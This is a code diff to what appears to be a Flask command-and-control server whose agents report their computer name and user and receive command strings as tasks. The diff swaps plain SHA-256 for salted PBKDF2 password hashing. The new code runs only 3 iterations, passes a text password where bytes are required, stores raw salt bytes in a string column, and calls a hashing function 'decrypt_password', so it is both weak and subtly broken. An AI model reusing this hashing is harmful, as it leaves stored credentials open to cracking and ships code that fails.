@@ -35,18 +35,21 @@ class Task(db.Model): # a SQLAlchemy class
     cmd = db.Column(db.String(4096))
     job_status = db.Column(db.String(288))
 
-
-
-class Client(db.Model, flask_login.UserMixin):
+# Define models
+roles_users = db.Table('roles_users',
+        db.Column('user_id', db.Integer(), db.ForeignKey('client.id')),
+        db.Column('role_id', db.Integer(), db.ForeignKey('role.id')))
+class Client(db.Model, UserMixin):
     id = db.Column(db.Integer, primary_key=True)
     client_id = db.Column(db.String(288))
+    salt = db.Column(db.String(40))
     password = db.Column(db.String(288))
-    # implants = db.relationship("Agent", backref='agent', lazy=True)
-
+    
 
 class Agent(db.Model): 
     id               = db.Column(db.Integer, primary_key = True)
     agent_id         = db.Column(db.String(288))
+    salt             = db.Column(db.String(40))
     password         = db.Column(db.String(288)) # secret key that verifies the agent with server
     computer_name    = db.Column(db.String(288)) # what computer did it connect from
     username         = db.Column(db.String(80)) # what user are you running as
@@ -103,19 +106,24 @@ def hash_passoword(password):
     """
         given a password as a string, return the hashed version
     """
-    h = hashlib.sha256()
-    h.update(password.encode(encoding='utf-8'))
-    hex_password = h.hexdigest()
-    return hex_password
+    salt = os.urandom(32)
+    digest = hashlib.pbkdf2_hmac('sha256', password, salt, 3)
+    return digest.hex(), salt
 
+def decrypt_password(password, salt):
+    """
+    given a password and a salt, reproduce the hash stroe in database
+    """
+    digest = hashlib.pbkdf2_hmac('sha256', password, salt, 3)
+    return digest.hex()
 
 def verify_agent_password(reg_agent_id, reg_password):
     """
         a function that verifies the password by comparing
         the hash stored in the database with the hash generated
     """
-    hex_password = hash_passoword(reg_password)
     agent = find_agent_by_id(reg_agent_id)
+    hex_password = decrypt_password(reg_password, agent.salt)
     return agent.password == hex_password
 
 def verify_client_password(reg_client_id, reg_password):
@@ -123,8 +131,8 @@ def verify_client_password(reg_client_id, reg_password):
         a function that verifies the password by comparing
         the hash stored in the database with the hash generated
     """
-    hex_password = hash_passoword(reg_password)
     client = find_client_by_id(reg_client_id)
+    hex_password = decrypt_password(reg_password, client.salt)
     return client.password == hex_password
 
 def list_agents():
